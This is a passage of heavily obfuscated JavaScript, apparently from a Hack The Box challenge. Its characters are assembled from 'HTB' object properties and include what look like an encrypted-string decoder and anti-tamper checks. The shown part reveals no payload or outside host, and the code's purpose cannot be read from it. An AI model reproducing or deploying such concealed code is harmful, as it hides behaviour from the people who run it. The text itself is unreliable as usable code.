_+HTB.$_$+HTB.$_$+")+"+HTB._$_+HTB.$$$+":"+HTB._$_+HTB.$$$+","+HTB.$$$+HTB.$_$+"++%("+HTB._$_+HTB.__$+"*"+HTB._$_+HTB.$_$+HTB._$_+"+-"+HTB._$_+HTB.$_$+HTB._$$+"*"+HTB._$_+HTB.__$+"+"+HTB._$_+HTB.$_$+HTB.$__+"))?"+HTB.__$+HTB.___+HTB.$___+"+="+HTB.$__$+HTB.$$$+"[\\\\'"+HTB._$_+HTB.__$+HTB.$$$+"\\\\'](-"+HTB._$_+HTB.$$_+HTB.___+"*"+HTB.__$+HTB.__$+"+"+HTB._$_+HTB.$$_+HTB.$$$+"+"+HTB._$_+HTB.$$_+HTB.$___+"*-"+HTB._$_+HTB._$$+HTB.$___+"&amp;"+HTB.$_$+HTB.$$_+">>(-(-"+HTB._$_+HTB.$$_+HTB.$$_+"+"+HTB._$_+HTB.$$_+HTB.$_$+"*-"+HTB.__$+HTB.__$+"+"+HTB._$_+HTB.$_$+HTB.__$+")*"+HTB.$$$+HTB.$_$+"&amp;-"+HTB._$_+HTB.$$_+HTB._$_+"+"+HTB.__$+HTB.__$+"*-"+HTB._$_+HTB.$$_+HTB._$$+"+-"+HTB._$_+HTB.$$_+HTB.$__+"*-"+HTB._$_+HTB.$__$+")):"+HTB._$_+HTB.$__$+"*"+HTB._$_+HTB.$__+HTB.$_$+"+"+HTB._$_+HTB.$__+HTB.$___+"+-"+HTB._$_+HTB.$__+HTB.$$_+"){"+HTB._$_+HTB.$$$+"="+HTB.__$+HTB.$__$+HTB.$__+"[\\\\'"+HTB._$_+HTB.$__+HTB.$$$+"\\\\']("+HTB._$_+HTB.$$$+")}"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.___+HTB.$___+"};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$_+HTB.$__+"="+HTB.$$$+"("+HTB._$_+HTB.$_$+","+HTB.__$+HTB.__$+HTB.__$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$$+"=[],"+HTB._$_+HTB.___+"=-"+HTB._$_+HTB.$$$+HTB.___+"*-"+HTB.__$+HTB.__$+"+-"+HTB._$$+HTB._$_+HTB.$$_+"+"+HTB.$__+HTB.___+HTB._$_+","+HTB.$__+HTB.___+","+HTB.$$$+HTB.$___+"=\\\\'\\\\',"+HTB.$__$+HTB.$___+"=\\\\'\\\\';"+HTB._$_+HTB.$_$+"="+HTB.__$+HTB.$$$+HTB.$$$+"("+HTB._$_+HTB.$_$+");"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB.$_$+"=-"+HTB._$_+HTB.__$+"*"+HTB.$__+HTB.$__$+HTB._$$+"+-"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$__$+HTB.$__+"+"+HTB.$__+HTB.$__$+HTB.$_$+"*"+HTB.__$+HTB.___+HTB._$$+","+HTB.__$+HTB.$__$+HTB.$__$+"="+HTB._$_+HTB.$_$+"[\\\\'"+HTB._$_+HTB._$$+"\\\\'];"+HTB.$$_+HTB.$_$+"&lt;"+HTB.__$+HTB.$__$+HTB.$__$+";"+HTB.$$_+HTB.$_$+"++){"+HTB.$__$+HTB.$___+"+=\\\\'%\\\\'+(\\\\'"+HTB.$__+HTB.$__$+HTB.$$_+"\\\\'+"+HTB._$_+HTB.$_$+"[\\\\'"+HTB.$___+HTB.$__+"\\\\']("+HTB.$$_+HTB.$_$+")[\\\\'"+HTB.$$_+HTB.$__$+"\\\\']("+HTB.$__+HTB.$__$+HTB._$_+"+"+HTB.__$+HTB.__$+"*-"+HTB.$_$+HTB.___+"+"+HTB.$__+HTB.$__$+HTB.__$+"*-"+HTB.__$+HTB.__$+"))[\\\\'"+HTB.$__+HTB.$___+HTB.$$$+"\\\\'](-(-"+HTB.$__+HTB.$___+HTB.$___+"*-"+HTB._$_+HTB.__$+"+"+HTB.$__+HTB.$___+HTB.$__$+"+-"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$__$+HTB.___+"))}"+HTB._$_+HTB.$_$+"="+HTB.__$+HTB.$__$+HTB.__$+"("+HTB.$__$+HTB.$___+");"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$_+";"+HTB._$_+HTB.$__+"("+HTB.__$+HTB._$_+"="+HTB.$__+HTB.$__$+HTB.$$$+"+-"+HTB.$__+HTB.$__$+HTB.$___+"+"+HTB._$_+HTB.__$+HTB.$_$+"*-"+HTB.$_$+HTB.___+HTB.$_$+";"+HTB.__$+HTB._$_+"&lt;"+HTB.$_$+HTB.___+HTB.$$_+"+"+HTB.$_$+HTB.___+HTB.$$$+"+-"+HTB.$_$+HTB.___+HTB.$__+";"+HTB.__$+HTB._$_+"++){"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]="+HTB.__$+HTB._$_+"}"+HTB._$_+HTB.$__+"("+HTB.__$+HTB._$_+"="+HTB.$_$+HTB.___+HTB._$$+"+"+HTB.$__+HTB.$__$+HTB.$__$+"+-"+HTB.$_$+HTB.___+HTB.___+";"+HTB.__$+HTB._$_+"&lt;-"+HTB.$_$+HTB.___+HTB.__$+"+-"+HTB.$_$+HTB.___+HTB._$_+"+"+HTB.$__+HTB.$___+HTB.$$_+";"+HTB.__$+HTB._$_+"++){"+HTB._$_+HTB.___+"=("+HTB._$_+HTB.___+"+"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]+"+HTB.__$+HTB.__$+HTB.__$+"[\\\\'"+HTB.$___+HTB.$__+"\\\\']("+HTB.__$+HTB._$_+"%"+HTB.__$+HTB.__$+HTB.__$+"[\\\\'"+HTB._$_+HTB._$$+"\\\\']))%("+HTB._$_+HTB.$__$+"*-"+HTB.$__+HTB.$___+HTB.$_$+"+-"+HTB.$__+HTB.$$$+HTB.___+"+"+HTB.$__+HTB.$$$+HTB.__$+"),"+HTB.$__+HTB.___+"="+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"],"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]="+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"],"+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"]="+HTB.$__+HTB.___+"}"+HTB.__$+HTB._$_+"=-"+HTB.$__+HTB.$$$+HTB._$_+"+"+HTB.__$+HTB._$$+HTB.__$+"*"+HTB.$__+HTB.$$$+HTB._$$+"+-"+HTB.$__+HTB.$$_+HTB.$__$+","+HTB._$_+HTB.___+"="+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$$_+HTB.$___+"+"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$$_+HTB.$__+"+"+HTB.$__+HTB.$$_+HTB.$_$+"*-"+HTB.__$+HTB.__$+";"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$_$+HTB.__$+"="+HTB.$__+HTB.$$_+HTB.$$_+"+-"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$$_+HTB.$$$+"+-"+HTB._$_+HTB._$$+HTB.__$+"*-"+HTB.$__+HTB.$$$+HTB.$__+";"+HTB.$_$+HTB.__$+"&lt;"+HTB._$_+HTB.$_$+"[\\\\'"+HTB._$_+HTB._$$+"\\\\'];"+HTB.$_$+HTB.__$+"++){"+HTB.__$+HTB._$_+"=("+HTB.__$+HTB._$_+"+("+HTB.$__+HTB.$$$+HTB.$_$+"+"+HTB._$_+HTB._$$+HTB.$_$+"*"+HTB.$__+HTB.$___+HTB._$_+"+-"+HTB._$_+HTB.$__$+"*"+HTB.$__+HTB.$___+HTB._$$+"))%("+HTB._$_+HTB.__$+HTB.___+"*-"+HTB.$__+HTB.$___+HTB.$__+"+"+HTB.$_$+HTB.$__$+"*"+HTB.$__+HTB.$___+HTB.__$+"+"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$___+HTB.___+"),"+HTB._$_+HTB.___+"=("+HTB._$_+HTB.___+"+"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"])%(-"+HTB.$__+HTB.$$$+HTB.$$_+"+"+HTB.$__+HTB.$$$+HTB.$$$+"+"+HTB._$_+HTB.$__$+"*-"+HTB.$_$+HTB.___+HTB.$__$+"),"+HTB.$__+HTB.___+"="+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"],"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]="+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"],"+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"]="+HTB.$__+HTB.___+","+HTB.$$$+HTB.$___+"+="+HTB.$__$+HTB.$$$+"[\\\\'"+HTB._$_+HTB.__$+HTB.$$$+"\\\\']("+HTB._$_+HTB.$_$+"[\\\\'"+HTB.$___+HTB.$__+"\\\\']("+HTB.$_$+HTB.__$+")^"+HTB.__$+HTB.$$$+"[("+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]+"+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"])%("+HTB.$__+HTB.$$$+HTB.$__$+"*-"+HTB.__$+HTB.__$+"+-"+HTB.__$+HTB.__$+"*-"+HTB.$_$+HTB.___+HTB.$___+"+-"+HTB.$_$+HTB.__$+HTB.$$$+")])}"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.$___+"};"+HTB.__$+HTB.$$_+"[\\\\'"+HTB.__$+HTB.$__+HTB.$$$+"\\\\']="+HTB._$_+HTB._$_+HTB.$__+","+HTB.__$+HTB.$$_+"[\\\\'"+HTB.$___+HTB.$$$+"\\\\']={},"+HTB.__$+HTB.$$_+"[\\\\'"+HTB._$_+HTB._$_+HTB.$_$+"\\\\']=!![]}"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.__$+"="+HTB.__$+HTB.$$_+"[\\\\'"+HTB.$___+HTB.$$$+"\\\\']["+HTB._$$+HTB.$_$+"];"+HTB.__$+HTB.$__$+"("+HTB.$__$+HTB.__$+"==="+HTB.$_$+HTB.$$$+"){"+HTB.__$+HTB.$__$+"("+HTB.__$+HTB.$$_+"[\\\\'"+HTB.__$+HTB.$__+HTB.$$_+"\\\\']==="+HTB.$_$+HTB.$$$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__+HTB.$___+"="+HTB.$$$+"("+HTB._$_+HTB.__$+HTB.$__+"){"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB.$_$+HTB._$_+"\\\\']="+HTB._$_+HTB.__$+HTB.$__+","+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\']=["+HTB.$_$+HTB._$$+HTB.$__$+"+-"+HTB.$_$+HTB.$__+HTB.___+"+-"+HTB.$_$+HTB.$__+HTB.__$+"*-"+HTB.__$+HTB.$___+HTB.$__$+","+HTB.$_$+HTB._$$+HTB.$___+"+-"+HTB.$_$+HTB._$$+HTB.$$$+"+"+HTB.$_$+HTB._$$+HTB._$$+"*"+HTB._$_+HTB._$_+HTB.__$+",-"+HTB.$_$+HTB._$$+HTB.$__+"+"+HTB.$_$+HTB._$$+HTB.$_$+"+-"+HTB.$_$+HTB._$$+HTB.$$_+"],"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$$+HTB._$_+"\\\\']="+HTB.$$$+"(){"+HTB.$___+"\\\\'"+HTB.$_$+HTB.$__+HTB._$_+"\\\\'},"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB.$$$+"\\\\']=\\\\'\\\\\\\\"+HTB.$_$+HTB._$$+"+\\\\\\\\"+HTB.__$+HTB.$___+"*\\\\\\\\"+HTB.$$$+HTB._$$+"(\\\\\\\\"+HTB.$$$+HTB._$$+")\\\\\\\\"+HTB.__$+HTB.$___+"*{\\\\\\\\"+HTB.$_$+HTB._$$+"+\\\\\\\\"+HTB.__$+HTB.$___+"*\\\\',"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB.___+"\\\\']=\\\\'[\\\\\\\\"+HTB.$_$+HTB.$___+"|\\\\\\\\"+HTB._$$+HTB.$__$+"].+[\\\\\\\\"+HTB.$_$+HTB.$___+"|\\\\\\\\"+HTB._$$+HTB.$__$+"];?\\\\\\\\"+HTB.__$+HTB.$___+"*}\\\\'};"+HTB.$__+HTB.$___+"[\\\\'"+HTB.__$+HTB.___+HTB.$$_+"\\\\'][\\\\'"+HTB.__$+HTB.$__+HTB.$___+"\\\\']="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$_+HTB.$___+"="+HTB.$$_+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.$__$+"("+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB.$$$+"\\\\']+"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB.___+"\\\\']),"+HTB.__$+HTB.$$_+HTB.$$$+"="+HTB.__$+HTB._$_+HTB.$___+"[\\\\'"+HTB.__$+HTB._$$+HTB._$$+"\\\\']("+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$$+HTB._$_+"\\\\'][\\\\'"+HTB.$$_+HTB.$__$+"\\\\']())?--"+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\']["+HTB.__$+HTB.__$+"*"+HTB.$_$+HTB.$__+HTB._$$+"+"+HTB.$_$+HTB.$_$+HTB.___+"+-"+HTB._$$+HTB.$$$+HTB.__$+"]:--"+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\']["+HTB.$_$+HTB.$_$+HTB.__$+"*-"+HTB.__$+HTB._$_+HTB.$_$+"+-"+HTB.$_$+HTB.$_$+HTB._$_+"*"+HTB.__$+HTB.__$+"+"+HTB.$_$+HTB.$__+HTB.$__$+"];"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB.$$_+HTB.$__+"\\\\']("+HTB.__$+HTB.$$_+HTB.$$$+")},"+HTB.$__+HTB.$___+"[\\\\'"+HTB.__$+HTB.___+HTB.$$_+"\\\\'][\\\\'"+HTB.__$+HTB.$$_+HTB.$__+"\\\\']="+HTB.$$$+"("+HTB.$__$+HTB.___+"){"+HTB.__$+HTB.$__$+"(!"+HTB.$_$+HTB.$__+HTB.$___+"(~"+HTB.$__$+HTB.___+"))"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.___+";"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB._$_+"\\\\']("+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB.$_$+HTB._$_+"\\\\'])},"+HTB.$__+HTB.$___+"[\\\\'"+HTB.__$+HTB.___+HTB.$$_+"\\\\'][\\\\'"+HTB.__$+HTB._$_+HTB._$_+"\\\\']="+HTB.$$$+"("+HTB.__$+HTB.__$+HTB.$__$+"){"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$___+HTB._$_+"="+HTB.__$+HTB.$$$+HTB.__$+"*-"+HTB.$_$+HTB.$__+HTB.$__+"+-"+HTB.$_$+HTB.$__+HTB.$_$+"*-"+HTB._$_+HTB.__$+"+-"+HTB.__$+HTB.__$+"*"+HTB.$_$+HTB._$$+HTB._$_+","+HTB.$$$+HTB.$$$+"="+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\'][\\\\'"+HTB._$_+HTB._$$+"\\\\'];"+HTB.$___+HTB._$_+"&lt;"+HTB.$$$+HTB.$$$+";"+HTB.$___+HTB._$_+"++){"+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\'][\\\\'"+HTB.__$+HTB.__$+HTB._$_+"\\\\']("+HTB.__$+HTB._$_+HTB.__$+"[\\\\'"+HTB.$_$+HTB._$$+HTB.__$+"\\\\']("+HTB.__$+HTB._$_+HTB.__$+"[\\\\'"+HTB.$_$+HTB.__$+HTB.$___+"\\\\']())),"+HTB.$$$+HTB.$$$+"="+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\'][\\\\'"+HTB._$_+HTB._$$+"\\\\']}"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$__$+"("+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\'][-"+HTB.$_$+HTB.__$+HTB.$__$+"+-"+HTB.__$+HTB.$_$+HTB.$___+"*-"+HTB.$_$+HTB.__$+HTB.___+"+-"+HTB.__$+HTB.__$+"*-"+HTB.$_$+HTB.__$+HTB.__$+"])},"+HTB.$$_+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__+HTB.$___+"("+HTB.__$+HTB.$$_+")[\\\\'"+HTB.__$+HTB.$__+HTB.$___+"\\\\'](),"+HTB.__$+HTB.$$_+"[\\\\'"+HTB.__$+HTB.$__+HTB.$$_+"\\\\']=!![]}"+HTB._$$+HTB.$$_+"="+HTB.__$+HTB.$$_+"[\\\\'"+HTB.__$+HTB.$__+HTB.$$$+"\\\\']("+HTB._$$+HTB.$$_+","+HTB.__$+HTB.$$_+HTB.$__$+"),"+HTB.__$+HTB.$$_+"[\\\\'"+HTB.$___+HTB.$$$+"\\\\']["+HTB._$$+HTB.$_$+"]="+HTB._$$+HTB.$$_+"}"+HTB.$__+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$$_+"="+HTB.$__$+HTB.__$+";"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$$_+"};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$___+"="+HTB.__$+HTB.$$_+","+HTB.__$+HTB.$__$+HTB._$_+"="+HTB.__$+HTB.$$_+","+HTB.__$+HTB.$__+HTB.$__+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$_$+"=!![];"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$$+"("+HTB.__$+HTB.$__+HTB.$__$+","+HTB.$$$+HTB.__$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB.___+"="+HTB.__$+HTB.__$+HTB.$_$+"?"+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+HTB.$_$+"="+HTB.__$+HTB.$$_+";"+HTB.__$+HTB.$__$+"("+HTB.$$$+HTB.__$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB.__$+"="+HTB.$$$+HTB.__$+"["+HTB.__$+HTB.$__+HTB.$_$+"(\\\\'"+HTB.$_$+HTB.__$+HTB._$_+"\\\\',\\\\'"+HTB.$_$+HTB.__$+HTB._$$+"[\\\\')]("+HTB.__$+HTB.$__+HTB.$__$+","+HTB.$$_+HTB.$$_+");"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.__$+"="+HTB.$__+HTB.$_$+","+HTB.__$+HTB.$_$+HTB.__$+"}}:"+HTB.$$$+"(){};"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$_$+"=![],"+HTB.__$+HTB.$_$+HTB.___+"}}(),"+HTB.$___+HTB.$_$+"="+HTB.__$+HTB.$__+HTB.$__+"("+HTB.__$+HTB._$$+","+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__+HTB.__$+"="+HTB.__$+HTB.$$_+","+HTB.$_$+HTB._$_+HTB.___+"="+HTB.__$+HTB.$$_+","+HTB.$__+HTB._$_+"={};"+HTB.$__+HTB._$_+"[\\\\'"+HTB.$_$+HTB._$_+HTB.__$+"\\\\']="+HTB.$$$+"("+HTB.__$+HTB.$__+HTB._$$+","+HTB.__$+HTB._$$+HTB.$___+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+HTB._$$+"==="+HTB.__$+HTB._$$+HTB.$___+"},"+HTB.$__+HTB._$_+"["+HTB.$__+HTB.__$+"(\\\\'"+HTB.__$+HTB._$$+HTB.$$$+"\\\\',\\\\'"+HTB.$$_+HTB.___+"\\\\')]=\\\\'"+HTB.__$+HTB.$__+HTB.___+"\\\\',"+HTB.$__+HTB._$_+"[\\\\'"+HTB.$_$+HTB._$_+HTB.$___+"\\\\']="+HTB.$$$+"("+HTB.__$+HTB._$$+HTB.$$_+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$$+HTB.$$_+"()};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB._$$+"="+HTB.$__+HTB._$_+","+HTB.$___+HTB.$___+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB._$_+"="+HTB.$__+HTB.__$+","+HTB.__$+HTB.___+HTB.$__$+"="+HTB.$__+HTB.__$+";"+HTB.__$+HTB.$__$+"("+HTB.$$_+HTB._$$+"["+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB.___+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB.$$_+"\\\\')]("+HTB.$$_+HTB._$$+"["+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB._$_+HTB.$__$+"\\\\',\\\\'"+HTB.$_$+HTB._$$+HTB.___+"\\\\')],\\\\'"+HTB.__$+HTB.$__+HTB.___+"\\\\')){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+HTB._$$+"="+HTB.$___+HTB.$___+"[\\\\'"+HTB.$__$+HTB.$__+"\\\\'+\\\\'"+HTB.$___+HTB._$$+"\\\\']("+HTB.__$+HTB.___+HTB.$__$+"(\\\\'"+HTB.$_$+HTB._$_+HTB.$$$+"\\\\',\\\\'"+HTB.__$+HTB.___+HTB.$$$+"\\\\')+"+HTB.__$+HTB.___+HTB.$__$+"(\\\\'"+HTB.$_$+HTB._$_+HTB.$$_+"\\\\',\\\\'"+HTB.$_$+HTB._$_+HTB._$_+"\\\\')+\\\\'/\\\\')()[\\\\'"+HTB.$__$+HTB.$__+"\\\\'+\\\\'"+HTB.$___+HTB._$$+"\\\\']("+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB._$_+HTB._$$+"\\\\',\\\\'"+HTB.$_$+HTB._$_+HTB.$__+"$\\\\')+\\\\'[^\\\\\\\\"+HTB.__$+HTB.$___+"]+)+)+[\\\\'+"+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB._$_+HTB.$_$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$__$+"^"+HTB._$_+HTB._$_+HTB.$___+"\\\\'));"+HTB.$___+"!"+HTB.__$+HTB.$$_+HTB._$$+"["+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB.$_$+HTB._$$+"\\\\',\\\\'"+HTB.__$+HTB._$$+HTB.___+"]"+HTB.__$+HTB._$_+HTB.$__$+"\\\\')]("+HTB.$___+HTB.$_$+")}"+HTB.$__+HTB.$$$+"{"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.$_$+HTB.__$+HTB.$__+"(){"+HTB.$_$+HTB.__$+HTB.$_$+"="+HTB.$_$+HTB.__$+HTB.$$_+"}}};"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB._$$+"["+HTB.$__+HTB.__$+"(\\\\'"+HTB.$_$+HTB.$__+HTB.$$$+"\\\\',\\\\'"+HTB.$_$+HTB.$__+HTB.$$_+"%"+HTB.$__+HTB.$$$+HTB.$___+"\\\\')]("+HTB.$___+HTB.$___+")});"+HTB.$___+HTB.$_$+"();"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB._$$+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$___+HTB.$$_+"=!![];"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$$+"("+HTB.__$+HTB.$_$+HTB.$$_+","+HTB.$$_+HTB._$_+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB.$__+"="+HTB.$___+HTB.$$_+"?"+HTB.$$$+"(){"+HTB.__$+HTB.$__$+"("+HTB.$$_+HTB._$_+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB.$_$+"="+HTB.$$_+HTB._$_+"[\\\\'"+HTB._$_+HTB.___+HTB.$___+"\\\\']("+HTB.__$+HTB.$_$+HTB.$$_+","+HTB.$$_+HTB.$$_+");"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB._$_+"="+HTB.$__+HTB.$_$+","+HTB.__$+HTB.$_$+HTB.$_$+"}}:"+HTB.$$$+"(){};"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$___+HTB.$$_+"=![],"+HTB.__$+HTB.$_$+HTB.$__+"}}(),"+HTB._$_+HTB.___+HTB.__$+"="+HTB._$$+HTB._$$+"("+HTB.__$+HTB._$$+","+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__$+"="+HTB.__$+HTB.$$_+","+HTB.__$+HTB.___+"="+HTB.__$+HTB.$$_+","+HTB.__$+HTB.$_$+"={};"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB.$_$+HTB.$___+"\\\\',\\\\'"+HTB.__$+HTB.$___+HTB.$$_+"#\\\\')]="+HTB.$$$+"("+HTB.__$+HTB.$$_+HTB.___+","+HTB.__$+HTB.$_$+HTB.$__$+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+HTB.___+"("+HTB.__$+HTB.$_$+HTB.$__$+")},"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$$_+HTB._$_+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB.$$_+"\\\\')]="+HTB.$$$+"("+HTB.__$+HTB.__$+HTB.$$$+","+HTB.__$+HTB.__$+HTB.$___+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$$$+"+"+HTB.__$+HTB.__$+HTB.$___+"},"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB.$$$+HTB._$_+"\\\\',\\\\'"+HTB.__$+HTB._$$+HTB.___+"]"+HTB.__$+HTB._$_+HTB.$__$+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$$_+"$\\\\')+"+HTB.$__$+"(\\\\'"+HTB.__$+HTB._$$+HTB.__$+"\\\\',\\\\'%"+HTB.$__+HTB.$$_+HTB._$$+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB._$$+"\\\\',\\\\'"+HTB.__$+HTB.$__$+HTB.$___+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB.$__+"\\\\',\\\\'"+HTB.$__+HTB.___+HTB.___+")"+HTB._$$+HTB.$__$+HTB.$__$+"\\\\')+"+HTB.__$+HTB.___+"(\\\\'"+HTB._$$+HTB.$__$+HTB.$_$+"\\\\',\\\\'!"+HTB._$_+HTB.___+HTB._$_+"\\\\')+\\\\'"+HTB._$$+HTB.$__$+HTB.$$_+"\\\\\\\\"+HTB._$$+HTB.$__$+HTB.$$$+"\\\\\\\\"+HTB._$$+HTB.$__$+")(\\\\'+\\\\'\\\\\\\\"+HTB.__$+HTB.$___+")\\\\',"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB.$__+HTB._$_+"\\\\')]="+HTB.$$$+"("+HTB.__$+HTB._$_+HTB._$$+","+HTB.__$+HTB._$_+HTB.$__+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$_+HTB._$$+"==="+HTB.__$+HTB._$_+HTB.$__+"},"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB._$$+HTB.$__$+HTB.$___+"\\\\',\\\\'"+HTB._$_+HTB.___+HTB._$$+"\\\\')]=\\\\'"+HTB.$__+HTB.___+HTB.$_$+"\\\\',"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB._$_+HTB.$$_+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB._$$+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.__$+HTB._$_+HTB.$_$+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB.$$_+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB._$$+"\\\\')]="+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.__$+HTB._$$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$$$+"\\\\'),"+HTB.__$+HTB.$_$+"[\\\\'"+HTB.$__+HTB.__$+HTB.$__+"\\\\']="+HTB.$__$+"(\\\\'"+HTB._$_+HTB._$$+HTB.__$+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB